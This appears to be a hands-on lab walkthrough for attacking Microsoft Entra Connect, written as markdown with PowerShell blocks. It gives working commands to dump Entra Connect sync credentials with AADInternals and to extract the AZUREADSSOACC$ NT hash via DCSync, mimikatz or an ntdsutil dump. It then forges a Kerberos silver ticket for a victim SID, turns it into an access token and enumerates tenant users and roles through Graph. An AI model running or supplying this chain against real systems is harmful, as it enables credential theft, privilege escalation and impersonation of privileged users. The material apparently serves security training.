## lab 2 - Entra Connect Attacks
1. **prepare a victim user with high privileges**: in Entra portal (login with your admin tenant creds), select ***user10*** and assign it with the **Application Administrator** role
2. Dumping and Extracting Entra (Azure AD) Connect credentials:
    1. run powershell as admin on the server where Entra Connect is installed
    2. execute:
        ```powershell
        Import-Module AADInternals
        Get-AADIntSyncCredentials
        ```


3. reset password


## 3. Silver Ticket Attack ##
### 1. detect if SSO is enabled:
```powershell
$body = @{
    "username" = "user10@mydomain.onmicrosoft.com"
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Method Post -Body $body -ContentType "application/json"
$response
```

Set the domain:
```powershell
$domain = "MYDOMAIN" # change to your domain name WITHOUT the ".onmicrosoft.com" part 
```

### 2. get AZUREADSSOACC computer account's hash:
```powershell
# Option 1: Get-ADReplAccount
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain $domain -Server dcvm # take the "NTHash" part

# Option 2: mimikatz
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$"
    
# Option 3: Dump NTDS.dit and registry:
ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q
# Now the AD and registry are dumped to C:\temp and we can extract the password hash using DSInternals.

# use DSInternals
Import-Module DSInternals

# Get the Boot key
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'

# Get the password hash of AZUREADSSOACC
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hex
# remote the empy spaces and keep the hash
```

Set the hash:
```powershell
$hash = "CHANGEME"
```
### 3. Find victim user to impersonate
1. option 1:
    ```powershell
    # Option 1: query Entra + get roles
    Import-Module AzureAD
    Connect-AzureAD # use the dumped Entra Connect creds
    # list users with roles
    Get-AzureADUser -All $true | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null } | ForEach-Object { $user = $_; Get-AzureADDirectoryRole | ForEach-Object { Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='Role';Expression={$_.DisplayName}} } } | Format-Table -Wrap -AutoSize


    # Option 2: query AD (w/o getting Entra roles)
    Get-ADReplAccount -SamAccountName 'victim' -Domain $domain -Server dcvm
    ```

Set the victim user's SID:
```powershell
$victimUserSid = "S-1-5-21-CHANGEME" # set the sid of the user you wish to impersonate
```

### 4. Perform the attack
```powershell
$fullyQualifiedDomain = "$domain.onmicrosoft.com" # change to your domain name

# generate kerberos ticket
$kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash

# get an access token for that user
$at =Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $fullyQualifiedDomain


# start exploring using MS Graph API!
$MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
Import-Module Microsoft.Graph.Users
$securedAT = ConvertTo-SecureString $at -AsPlainText -Force
Connect-MgGraph -AccessToken $securedAT

Get-MgUser
#Readme: https://aka.ms/graph/sdk/powershell
#SDK Docs: https://aka.ms/graph/sdk/powershell/docs
#API Docs: https://aka.ms/graph/docs



## MORE FUN
# Get all users in the tenant
$users = Get-MgUser -All

# Initialize an array to store the results
$results = @()

foreach ($user in $users) {
    # Get the roles assigned to the user (App Roles and Directory Roles)
    $appRoles = Get-MgUserAppRoleAssignment -UserId $user.Id -ErrorAction SilentlyContinue
    $directoryRoles = Get-MgUserMemberOf -UserId $user.Id -ErrorAction SilentlyContinue | Where-Object {$_.AdditionalProperties['@odata.type'] -eq '#microsoft.graph.directoryRole'}
    
    # Compile each role into a formatted object
    foreach ($role in $appRoles) {
        $results += [pscustomobject]@{
            UserPrincipalName = $user.UserPrincipalName
            DisplayName       = $user.DisplayName
            RoleType          = "App Role"
            RoleName          = $role.DisplayName
        }
    }
    
    foreach ($role in $directoryRoles) {
        $results += [pscustomobject]@{
            UserPrincipalName = $user.UserPrincipalName
            DisplayName       = $user.DisplayName
            RoleType          = "Directory Role"
            RoleName          = $role.DisplayName
        }
    }
}

# Output the results
$results | Format-Table -AutoSize
```